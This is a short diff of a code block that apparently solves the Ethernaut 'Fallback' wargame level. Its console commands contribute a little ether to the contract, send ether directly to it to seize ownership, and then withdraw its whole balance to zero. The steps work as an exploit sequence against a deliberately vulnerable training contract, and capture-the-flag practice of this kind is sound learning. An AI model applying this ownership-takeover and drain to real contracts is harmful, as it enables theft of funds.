@@ -1,19 +1,16 @@
 ```javascript
-/**
- * 1.you claim ownership of the contract
- * 2.you reduce its balance to 0
- */
 await contract.owner()
 '0x....'  // Level address
-await sendTransaction({from: player, to: contract.address, value: toWei('0.00001')})
-// ⛏️ Sent transaction ⛏
+await contract.getContribution()
+// {.., words: (2) [0, empty], ..}
+await contract.contribute({value: toWei('0.0001')})
+await sendTransaction({from: player, to: contract.address, value: toWei('0.0001')})
 await contract.owner()
 '0x....'  // My address
 
 await getBalance(contract.address)
 '0.00012'
 await contract.withdraw()
-// ⛏️ Sent transaction ⛏
 await getBalance(contract.address)
 '0'
 ```
